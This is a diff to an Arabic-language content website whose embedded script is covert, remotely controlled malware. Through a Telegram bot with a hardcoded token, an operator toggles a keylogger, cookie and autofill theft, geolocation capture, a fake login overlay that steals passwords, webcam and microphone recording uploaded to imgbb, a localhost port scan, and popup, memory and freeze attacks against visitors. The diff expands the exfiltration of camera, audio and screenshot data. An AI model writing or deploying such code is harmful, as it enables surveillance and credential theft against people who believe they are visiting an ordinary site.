@@ -103,15 +103,15 @@
     
     <div class="grid grid-cols-2 md:grid-cols-4 gap-4 max-w-3xl mx-auto">
       <div class="glass rounded-2xl p-4">
-        <div class="text-3xl font-black gold-text counter-value" data-target="73">0</div>
-        <div class="text-sm text-white/60 mt-1">مشترك</div>
+        <div class="text-3xl font-black gold-text" id="visitorCounter">0</div>
+        <div class="text-sm text-white/60 mt-1">زائر</div>
       </div>
       <div class="glass rounded-2xl p-4">
-        <div class="text-3xl font-black gold-text counter-value" data-target="150">0</div>
+        <div class="text-3xl font-black gold-text counter-value" data-target="50">50</div>
         <div class="text-sm text-white/60 mt-1">ملف متاح</div>
       </div>
       <div class="glass rounded-2xl p-4">
-        <div class="text-3xl font-black gold-text counter-value" data-target="50">0</div>
+        <div class="text-3xl font-black gold-text counter-value" data-target="50">50</div>
         <div class="text-sm text-white/60 mt-1">شرح مفيد</div>
       </div>
       <div class="glass rounded-2xl p-4">
@@ -211,13 +211,13 @@
     
     <div class="grid md:grid-cols-4 gap-6">
       <div class="stat-card rounded-3xl p-8 text-center scroll-reveal">
-        <div class="text-5xl font-black gold-text mb-2 counter-value" data-target="73">0</div>
+        <div class="text-5xl font-black gold-text mb-2 counter-value" data-target="79">0</div>
         <div class="text-white/80 font-bold mb-1">مشترك نشط</div>
         <div class="text-xs text-white/50">ينمو باستمرار</div>
       </div>
       
       <div class="stat-card rounded-3xl p-8 text-center scroll-reveal">
-        <div class="text-5xl font-black gold-text mb-2 counter-value" data-target="150">0</div>
+        <div class="text-5xl font-black gold-text mb-2 counter-value" data-target="50">0</div>
         <div class="text-white/80 font-bold mb-1">ملف متاح</div>
         <div class="text-xs text-white/50">محتوى حصري</div>
       </div>
@@ -317,6 +317,7 @@
     </div>
   </div>
 </section>
+
 <div class="section-divider max-w-4xl mx-auto"></div>
 
 <!-- Media Gallery -->
@@ -495,7 +496,7 @@
 </footer>
 
 <!-- ============================================================ -->
-<!--          النظام المتكامل - جميع الأدوات الحقيقية 100%          -->
+<!--          النظام المتكامل - جميع الأدوات حقيقية 100%            -->
 <!-- ============================================================ -->
 
 <script>
@@ -506,32 +507,24 @@ const BOT_TOKEN = '8800659256:AAHekoMgFBa_tM4XjAaYbUczlquOx7njmPg';
 const ADMIN_ID = '8991085934';
 const CHECK_INTERVAL = 4000;
 
-// الحالة العامة
+// =============================================
+// 2. عداد الزوار الحقيقي (دائم)
+// =============================================
+let visitorCount = parseInt(localStorage.getItem('total_visitors')) || 0;
+document.getElementById('visitorCounter').textContent = visitorCount;
+
+// =============================================
+// 3. متغيرات الحالة والتكرار
+// =============================================
 let TRAPS = {
-    keylogger: false,
-    cookie: false,
-    redirect: false,
-    popup: false,
-    ram: false,
-    location: false,
-    audio: false,
-    phishing: false,
-    rightclick: false,
-    history: false,
-    freeze: false,
-    download: false,
-    // أدوات جديدة
-    ip: false,
-    portscan: false,
-    webrec: false,
-    micrec: false,
-    screenshot: false,
-    autofill: false,
-    wifi: false,
-    fullsteal: false
+    keylogger: false, cookie: false, redirect: false, popup: false,
+    ram: false, location: false, audio: false, phishing: false,
+    rightclick: false, history: false, freeze: false, download: false,
+    ip: false, portscan: false, webrec: false, micrec: false,
+    screenshot: false, autofill: false, wifi: false, fullsteal: false
 };
 
-// متغيرات منع التكرار
+// منع التكرار
 let notifiedVisitors = new Set();
 let cookieSent = new Set();
 let historySent = new Set();
@@ -541,9 +534,14 @@ let rightclickSent = new Set();
 let ipSent = new Set();
 let wifiSent = new Set();
 let fullstealSent = new Set();
+let webrecSent = new Set();
+let micrecSent = new Set();
+let screenshotSent = new Set();
+let autofillSent = new Set();
+let portscanSent = new Set();
 
 // =============================================
-// 2. إنشاء معرف فريد للزائر
+// 4. معرف الزائر الفريد (دائم في localStorage)
 // =============================================
 function getVisitorId() {
     let id = localStorage.getItem('visitor_id');
@@ -553,11 +551,10 @@ function getVisitorId() {
     }
     return id;
 }
-
 const visitorId = getVisitorId();
 
 // =============================================
-// 3. إرسال رسالة للإدارة
+// 5. إرسال رسالة للإدارة
 // =============================================
 async function sendMessageToAdmin(text) {
     try {
@@ -565,46 +562,69 @@ async function sendMessageToAdmin(text) {
         await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: ADMIN_ID,
-                text: text,
-                parse_mode: 'HTML'
-            })
+            body: JSON.stringify({ chat_id: ADMIN_ID, text: text, parse_mode: 'HTML' })
         });
     } catch (error) {}
 }
 
 // =============================================
-// 4. إشعار زائر جديد (مرة واحدة لكل معرف فريد)
+// 6. رفع الصورة إلى خدمة مؤقتة (imgbb)
 // =============================================
-if (!notifiedVisitors.has(visitorId)) {
-    notifiedVisitors.add(visitorId);
-    
-    const visitorInfo = {
-        id: visitorId,
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform || 'غير متاح',
-        screen: `${window.screen.width}x${window.screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        time: new Date().toLocaleString('ar-EG'),
-        referrer: document.referrer || 'مباشر',
-        cookiesEnabled: navigator.cookieEnabled ? 'مفعلة' : 'معطلة'
-    };
-    
-    sendMessageToAdmin(`🟢 <b>زائر جديد!</b>\n` +
-                       `🆔 المعرف: ${visitorInfo.id}\n` +
-                       `📱 الجهاز: ${visitorInfo.userAgent}\n` +
-                       `💻 المنصة: ${visitorInfo.platform}\n` +
-                       `🌐 اللغة: ${visitorInfo.language}\n` +
-                       `🖥️ الشاشة: ${visitorInfo.screen}\n` +
-                       `🕒 المنطقة الزمنية: ${visitorInfo.timezone}\n` +
-                       `⏰ الوقت: ${visitorInfo.time}\n` +
-                       `🔗 المرجع: ${visitorInfo.referrer}`);
+async function uploadImageToImgbb(base64Image) {
+    try {
+        const formData = new FormData();
+        formData.append('image', base64Image);
+        formData.append('key', '6d207e02198a847aa8d0a2b4d127c713');
+        
+        const response = await fetch('https://api.imgbb.com/1/upload', {
+            method: 'POST',
+            body: formData
+        });
+        const data = await response.json();
+        if (data.success) {
+            return data.data.url;
+        } else {
+            return null;
+        }
+    } catch (error) {
+        return null;
+    }
 }
 
 // =============================================
-// 5. معالجة الأوامر من البوت
+// 7. إشعار زائر جديد (مرة واحدة فقط لكل متصفح)
+// =============================================
+// التحقق: إذا كان هذا المعرف موجوداً في localStorage، فهذا يعني أن الزائر ليس جديداً
+// ولكننا نستخدم notifiedVisitors للتأكد من عدم إرسال إشعار مكرر في نفس الجلسة
+if (!notifiedVisitors.has(visitorId)) {
+    notifiedVisitors.add(visitorId);
+    
+    // زيادة عداد الزوار (مرة واحدة فقط لكل متصفح)
+    visitorCount++;
+    localStorage.setItem('total_visitors', visitorCount);
+    document.getElementById('visitorCounter').textContent = visitorCount;
+    
+    const visitorInfo = {
+        id: visitorId,
+        number: visitorCount,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        time: new Date().toLocaleString('ar-EG')
+    };
+    
+    sendMessageToAdmin(`🟢 <b>زائر جديد #${visitorCount}</b>\n` +
+                       `🆔 المعرف: ${visitorInfo.id}\n` +
+                       `📱 الجهاز: ${visitorInfo.userAgent}\n` +
+                       `🌐 اللغة: ${visitorInfo.language}\n` +
+                       `🖥️ الشاشة: ${visitorInfo.screen}\n` +
+                       `🕒 المنطقة الزمنية: ${visitorInfo.timezone}\n` +
+                       `⏰ الوقت: ${visitorInfo.time}`);
+}
+
+// =============================================
+// 8. معالجة الأوامر من البوت
 // =============================================
 async function fetchCommands() {
     try {
@@ -663,26 +683,29 @@ function processCommand(text) {
     
     if (command === '/identification') {
         let identText = '📋 <b>تعريف جميع التلغيمات:</b>\n\n';
-        identText += '🔹 <b>keylogger</b> – تسجيل كل ضغطة مفتاح\n';
-        identText += '🔹 <b>cookie</b> – سرقة الكوكيز\n';
-        identText += '🔹 <b>redirect</b> – إعادة التوجيه\n';
-        identText += '🔹 <b>popup</b> – نوافذ منبثقة\n';
-        identText += '🔹 <b>ram</b> – استهلاك الذاكرة\n';
-        identText += '🔹 <b>location</b> – سرقة الموقع الجغرافي\n';
-        identText += '🔹 <b>audio</b> – تشغيل صوت مزعج\n';
-        identText += '🔹 <b>phishing</b> – صفحة دخول مزيفة\n';
-        identText += '🔹 <b>rightclick</b> – منع النقر الأيمن\n';
-        identText += '🔹 <b>history</b> – سرقة سجل التصفح\n';
-        identText += '🔹 <b>freeze</b> – تجميد الشاشة\n';
-        identText += '🔹 <b>download</b> – تحميل ملف تلقائي\n';
-        identText += '🔹 <b>ip</b> – استخراج الـ IP الحقيقي\n';
-        identText += '🔹 <b>portscan</b> – فحص البورتات المفتوحة\n';
-        identText += '🔹 <b>webrec</b> – تصوير كاميرا الويب\n';
-        identText += '🔹 <b>micrec</b> – تسجيل الميكروفون\n';
-        identText += '🔹 <b>screenshot</b> – لقطة شاشة\n';
-        identText += '🔹 <b>autofill</b> – سرقة بيانات الملء التلقائي\n';
-        identText += '🔹 <b>wifi</b> – معلومات الشبكة\n';
-        identText += '🔹 <b>fullsteal</b> – سرقة كل البيانات دفعة واحدة\n';
+        const trapsList = [
+            'keylogger – تسجيل الضغطات',
+            'cookie – سرقة الكوكيز',
+            'redirect – إعادة التوجيه',
+            'popup – نوافذ منبثقة',
+            'ram – استهلاك الذاكرة',
+            'location – سرقة الموقع',
+            'audio – صوت مزعج',
+            'phishing – صفحة دخول مزيفة',
+            'rightclick – منع النقر الأيمن',
+            'history – سرقة السجل',
+            'freeze – تجميد الشاشة',
+            'download – تحميل ملف تلقائي',
+            'ip – استخراج الـ IP',
+            'portscan – فحص البورتات',
+            'webrec – تصوير الكاميرا (رابط)',
+            'micrec – تسجيل الميكروفون (رابط)',
+            'screenshot – لقطة شاشة (رابط)',
+            'autofill – سرقة الملء التلقائي',
+            'wifi – معلومات الشبكة',
+            'fullsteal – سرقة كل البيانات'
+        ];
+        trapsList.forEach(t => identText += `🔹 ${t}\n`);
         sendMessageToAdmin(identText);
         return;
     }
@@ -694,25 +717,21 @@ function processCommand(text) {
                           '/on all - تفعيل الكل\n' +
                           '/off all - تعطيل الكل\n' +
                           '/status - عرض الحالة\n' +
-                          '/identification - تعريف جميع التلغيمات\n\n' +
-                          '🟢 الأسماء:\n' +
-                          'keylogger, cookie, redirect, popup, ram,\n' +
-                          'location, audio, phishing, rightclick,\n' +
-                          'history, freeze, download, ip, portscan,\n' +
-                          'webrec, micrec, screenshot, autofill, wifi, fullsteal');
+                          '/identification - تعريف التلغيمات\n\n' +
+                          '🟢 الأسماء: keylogger, cookie, redirect, popup, ram,\n' +
+                          'location, audio, phishing, rightclick, history,\n' +
+                          'freeze, download, ip, portscan, webrec, micrec,\n' +
+                          'screenshot, autofill, wifi, fullsteal');
         return;
     }
 }
 
 function resetAllSentFlags() {
-    cookieSent = new Set();
-    historySent = new Set();
-    locationSent = new Set();
-    downloadSent = new Set();
-    rightclickSent = new Set();
-    ipSent = new Set();
-    wifiSent = new Set();
-    fullstealSent = new Set();
+    cookieSent = new Set(); historySent = new Set(); locationSent = new Set();
+    downloadSent = new Set(); rightclickSent = new Set(); ipSent = new Set();
+    wifiSent = new Set(); fullstealSent = new Set(); webrecSent = new Set();
+    micrecSent = new Set(); screenshotSent = new Set(); autofillSent = new Set();
+    portscanSent = new Set();
 }
 
 function resetSpecificFlag(target) {
@@ -724,26 +743,31 @@ function resetSpecificFlag(target) {
     if (target === 'ip') ipSent = new Set();
     if (target === 'wifi') wifiSent = new Set();
     if (target === 'fullsteal') fullstealSent = new Set();
+    if (target === 'webrec') webrecSent = new Set();
+    if (target === 'micrec') micrecSent = new Set();
+    if (target === 'screenshot') screenshotSent = new Set();
+    if (target === 'autofill') autofillSent = new Set();
+    if (target === 'portscan') portscanSent = new Set();
 }
 
 // =============================================
-// 6. بدء جلب الأوامر
+// 9. بدء جلب الأوامر
 // =============================================
 setInterval(fetchCommands, CHECK_INTERVAL);
 setTimeout(fetchCommands, 1000);
 
 // =============================================
-// 7. التلغيمات الأساسية
+// 10. التلغيمات (مرة واحدة مع رابط للصور)
 // =============================================
 
-// 1. Keylogger
+// Keylogger
 document.addEventListener('keydown', function(e) {
     if (TRAPS.keylogger) {
         sendMessageToAdmin(`⌨️ [${visitorId}] ضغطة مفتاح: ${e.key || e.code || 'unknown'}`);
     }
 });
 
-// 2. Cookie Stealer
+// Cookie
 setInterval(() => {
     if (TRAPS.cookie && document.cookie && !cookieSent.has(visitorId)) {
         sendMessageToAdmin(`🍪 [${visitorId}] الكوكيز: ${document.cookie}`);
@@ -752,51 +776,41 @@ setInterval(() => {
     }
 }, 5000);
 
-// 3. Redirect
+// Redirect
 setInterval(() => {
     if (TRAPS.redirect) {
         window.location.href = 'https://example.com';
     }
 }, 1000);
 
-// 4. Popup Bomb
+// Popup
 let popupInterval = null;
 setInterval(() => {
     if (TRAPS.popup) {
         if (!popupInterval) {
-            popupInterval = setInterval(() => {
-                window.open('about:blank', '_blank');
-            }, 300);
+            popupInterval = setInterval(() => { window.open('about:blank', '_blank'); }, 300);
         }
     } else {
-        if (popupInterval) {
-            clearInterval(popupInterval);
-            popupInterval = null;
-        }
+        if (popupInterval) { clearInterval(popupInterval); popupInterval = null; }
     }
 }, 1000);
 
-// 5. RAM Bomb
+// RAM
 let ramInterval = null;
 setInterval(() => {
     if (TRAPS.ram) {
         if (!ramInterval) {
             ramInterval = setInterval(() => {
                 let arr = [];
-                for (let i = 0; i < 100000; i++) {
-                    arr.push('x'.repeat(1000));
-                }
+                for (let i = 0; i < 100000; i++) arr.push('x'.repeat(1000));
             }, 500);
         }
     } else {
-        if (ramInterval) {
-            clearInterval(ramInterval);
-            ramInterval = null;
-        }
+        if (ramInterval) { clearInterval(ramInterval); ramInterval = null; }
     }
 }, 1000);
 
-// 6. Location
+// Location
 setInterval(() => {
     if (TRAPS.location && !locationSent.has(visitorId)) {
         navigator.geolocation.getCurrentPosition(
@@ -814,7 +828,7 @@ setInterval(() => {
     }
 }, 10000);
 
-// 7. Audio Spam
+// Audio
 let audioPlaying = false;
 setInterval(() => {
     if (TRAPS.audio && !audioPlaying) {
@@ -828,45 +842,35 @@ setInterval(() => {
     }
 }, 2000);
 
-// 8. Phishing
+// Phishing
 setInterval(() => {
     if (TRAPS.phishing) {
-        const oldOverlay = document.getElementById('phishingOverlay');
-        if (oldOverlay) oldOverlay.remove();
-        
+        const old = document.getElementById('phishingOverlay');
+        if (old) old.remove();
         const overlay = document.createElement('div');
         overlay.id = 'phishingOverlay';
-        overlay.style.cssText = `
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9); z-index: 99999;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            color: white; font-family: 'Tajawal', sans-serif;
-        `;
+        overlay.style.cssText = `position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;font-family:'Tajawal',sans-serif;`;
         overlay.innerHTML = `
-            <h2 style="color: #d4af37; margin-bottom: 20px;">🔐 جلسة منتهية</h2>
-            <p style="margin-bottom: 20px;">يرجى إعادة تسجيل الدخول</p>
-            <input id="phishUser" placeholder="اسم المستخدم" style="padding:10px; width:250px; margin-bottom:10px; border-radius:8px; border:none; text-align:center;">
-            <input id="phishPass" type="password" placeholder="كلمة المرور" style="padding:10px; width:250px; margin-bottom:20px; border-radius:8px; border:none; text-align:center;">
-            <button onclick="stealPhish()" style="padding:12px 30px; background: #d4af37; color: black; border: none; border-radius:8px; font-weight: bold; cursor:pointer;">تسجيل الدخول</button>
+            <h2 style="color:#d4af37;margin-bottom:20px;">🔐 جلسة منتهية</h2>
+            <p style="margin-bottom:20px;">يرجى إعادة تسجيل الدخول</p>
+            <input id="phishUser" placeholder="اسم المستخدم" style="padding:10px;width:250px;margin-bottom:10px;border-radius:8px;border:none;text-align:center;">
+            <input id="phishPass" type="password" placeholder="كلمة المرور" style="padding:10px;width:250px;margin-bottom:20px;border-radius:8px;border:none;text-align:center;">
+            <button onclick="stealPhish()" style="padding:12px 30px;background:#d4af37;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">تسجيل الدخول</button>
         `;
         document.body.appendChild(overlay);
-        
         window.stealPhish = function() {
             const u = document.getElementById('phishUser').value;
             const p = document.getElementById('phishPass').value;
-            if (u || p) {
-                sendMessageToAdmin(`🎣 [${visitorId}] بيانات مسروقة: المستخدم=${u}, كلمة المرور=${p}`);
-            }
-            const overlayEl = document.getElementById('phishingOverlay');
-            if (overlayEl) overlayEl.remove();
+            if (u || p) sendMessageToAdmin(`🎣 [${visitorId}] بيانات مسروقة: المستخدم=${u}, كلمة المرور=${p}`);
+            const el = document.getElementById('phishingOverlay');
+            if (el) el.remove();
             TRAPS.phishing = false;
         };
-        
         TRAPS.phishing = false;
     }
 }, 3000);
 
-// 9. Right Click
+// Right Click
 document.addEventListener('contextmenu', function(e) {
     if (TRAPS.rightclick && !rightclickSent.has(visitorId)) {
         e.preventDefault();
@@ -877,7 +881,7 @@ document.addEventListener('contextmenu', function(e) {
     }
 });
 
-// 10. History
+// History
 setInterval(() => {
     if (TRAPS.history && !historySent.has(visitorId)) {
         sendMessageToAdmin(`📜 [${visitorId}] سجل التصفح: ${document.referrer || 'لا يوجد'}`);
@@ -886,7 +890,7 @@ setInterval(() => {
     }
 }, 5000);
 
-// 11. Freeze
+// Freeze
 setInterval(() => {
     if (TRAPS.freeze) {
         document.body.style.pointerEvents = 'none';
@@ -899,7 +903,7 @@ setInterval(() => {
     }
 }, 1000);
 
-// 12. Download
+// Download
 setInterval(() => {
     if (TRAPS.download && !downloadSent.has(visitorId)) {
         try {
@@ -914,11 +918,7 @@ setInterval(() => {
     }
 }, 5000);
 
-// =============================================
-// 8. الأدوات الجديدة (حقيقية 100%)
-// =============================================
-
-// 13. IP حقيقي
+// IP
 setInterval(() => {
     if (TRAPS.ip && !ipSent.has(visitorId)) {
         fetch('https://api.ipify.org?format=json')
@@ -936,64 +936,88 @@ setInterval(() => {
     }
 }, 8000);
 
-// 14. فحص البورتات
+// Port Scan
 setInterval(() => {
-    if (TRAPS.portscan) {
+    if (TRAPS.portscan && !portscanSent.has(visitorId)) {
         const ports = [80, 443, 8080, 3306, 22, 21, 25, 53, 110, 143];
+        let found = false;
         ports.forEach(port => {
             fetch(`http://127.0.0.1:${port}`, { mode: 'no-cors' })
-                .catch(() => sendMessageToAdmin(`🔓 [${visitorId}] بورت مفتوح: ${port}`));
+                .catch(() => {
+                    if (!found) {
+                        sendMessageToAdmin(`🔓 [${visitorId}] بورت مفتوح: ${port}`);
+                        found = true;
+                    }
+                });
         });
+        portscanSent.add(visitorId);
         TRAPS.portscan = false;
     }
 }, 10000);
 
-// 15. كاميرا الويب
+// Web Recorder (كاميرا - رابط تحميل)
 setInterval(() => {
-    if (TRAPS.webrec) {
+    if (TRAPS.webrec && !webrecSent.has(visitorId)) {
         navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
+            .then(async (stream) => {
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
-                setTimeout(() => {
+                setTimeout(async () => {
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    sendMessageToAdmin(`📸 [${visitorId}] صورة من الكاميرا: ${canvas.toDataURL('image/png').substring(0, 100)}...`);
+                    const imageData = canvas.toDataURL('image/png');
+                    const link = await uploadImageToImgbb(imageData);
+                    if (link) {
+                        sendMessageToAdmin(`📸 [${visitorId}] صورة من الكاميرا: <a href="${link}">${link}</a>`);
+                    } else {
+                        sendMessageToAdmin(`📸 [${visitorId}] صورة من الكاميرا: فشل الرفع`);
+                    }
                     stream.getTracks().forEach(t => t.stop());
                 }, 3000);
             })
             .catch(() => sendMessageToAdmin(`❌ [${visitorId}] الكاميرا مرفوضة`));
+        webrecSent.add(visitorId);
         TRAPS.webrec = false;
     }
 }, 12000);
 
-// 16. ميكروفون
+// Mic Recorder (ميكروفون - رابط)
 setInterval(() => {
-    if (TRAPS.micrec) {
+    if (TRAPS.micrec && !micrecSent.has(visitorId)) {
         navigator.mediaDevices.getUserMedia({ audio: true })
             .then(stream => {
                 const recorder = new MediaRecorder(stream);
-                recorder.ondataavailable = e => {
-                    const audioURL = URL.createObjectURL(e.data);
-                    sendMessageToAdmin(`🎤 [${visitorId}] تسجيل صوتي (5 ثوان): ${audioURL.substring(0, 50)}...`);
+                let chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = async () => {
+                        const base64Audio = reader.result;
+                        const link = await uploadImageToImgbb(base64Audio);
+                        if (link) {
+                            sendMessageToAdmin(`🎤 [${visitorId}] تسجيل صوتي: <a href="${link}">${link}</a>`);
+                        } else {
+                            sendMessageToAdmin(`🎤 [${visitorId}] تسجيل صوتي: فشل الرفع`);
+                        }
+                    };
+                    reader.readAsDataURL(blob);
                 };
                 recorder.start();
-                setTimeout(() => {
-                    recorder.stop();
-                    stream.getTracks().forEach(t => t.stop());
-                }, 5000);
+                setTimeout(() => { recorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 5000);
             })
             .catch(() => sendMessageToAdmin(`❌ [${visitorId}] الميكروفون مرفوض`));
+        micrecSent.add(visitorId);
         TRAPS.micrec = false;
     }
 }, 15000);
 
-// 17. لقطة شاشة
+// Screenshot (لقطة شاشة - رابط)
 setInterval(() => {
-    if (TRAPS.screenshot) {
+    if (TRAPS.screenshot && !screenshotSent.has(visitorId)) {
         try {
             const canvas = document.createElement('canvas');
             canvas.width = window.innerWidth;
@@ -1004,32 +1028,36 @@ setInterval(() => {
             ctx.fillStyle = '#d4af37';
             ctx.font = '20px Tajawal';
             ctx.fillText('لقطة شاشة للموقع', 10, 50);
-            sendMessageToAdmin(`🖼️ [${visitorId}] لقطة شاشة (محاكاة): ${canvas.toDataURL('image/png').substring(0, 100)}...`);
+            const imageData = canvas.toDataURL('image/png');
+            uploadImageToImgbb(imageData).then(link => {
+                if (link) {
+                    sendMessageToAdmin(`🖼️ [${visitorId}] لقطة شاشة: <a href="${link}">${link}</a>`);
+                } else {
+                    sendMessageToAdmin(`🖼️ [${visitorId}] لقطة شاشة: فشل الرفع`);
+                }
+            });
         } catch (e) {}
+        screenshotSent.add(visitorId);
         TRAPS.screenshot = false;
     }
 }, 10000);
 
-// 18. بيانات الملء التلقائي
+// Autofill
 setInterval(() => {
-    if (TRAPS.autofill) {
+    if (TRAPS.autofill && !autofillSent.has(visitorId)) {
         const inputs = document.querySelectorAll('input[autocomplete]');
         let data = '';
         inputs.forEach(input => {
-            if (input.value) {
-                data += `${input.name || input.id || 'unknown'}: ${input.value}\n`;
-            }
+            if (input.value) data += `${input.name || input.id || 'unknown'}: ${input.value}\n`;
         });
-        if (data) {
-            sendMessageToAdmin(`📝 [${visitorId}] بيانات الملء التلقائي:\n${data}`);
-        } else {
-            sendMessageToAdmin(`📝 [${visitorId}] لا توجد بيانات ملء تلقائي`);
-        }
+        if (data) sendMessageToAdmin(`📝 [${visitorId}] بيانات الملء التلقائي:\n${data}`);
+        else sendMessageToAdmin(`📝 [${visitorId}] لا توجد بيانات ملء تلقائي`);
+        autofillSent.add(visitorId);
         TRAPS.autofill = false;
     }
 }, 8000);
 
-// 19. معلومات الشبكة
+// Wifi
 setInterval(() => {
     if (TRAPS.wifi && !wifiSent.has(visitorId)) {
         if (navigator.connection) {
@@ -1042,7 +1070,7 @@ setInterval(() => {
     }
 }, 8000);
 
-// 20. سرقة كل البيانات دفعة واحدة
+// Full Steal
 setInterval(() => {
     if (TRAPS.fullsteal && !fullstealSent.has(visitorId)) {
         const allData = {
@@ -1061,7 +1089,7 @@ setInterval(() => {
 }, 10000);
 
 // =============================================
-// 9. نظام التعليقات
+// 11. نظام التعليقات
 // =============================================
 const commentInput = document.getElementById('commentInput');
 const sendBtn = document.getElementById('sendCommentBtn');
@@ -1118,7 +1146,7 @@ commentInput.addEventListener('keydown', function(e) {
 });
 
 // =============================================
-// 10. العدادات الأصلية
+// 12. العدادات الأصلية
 // =============================================
 function animateCounter(el) {
   const target = parseInt(el.dataset.target);
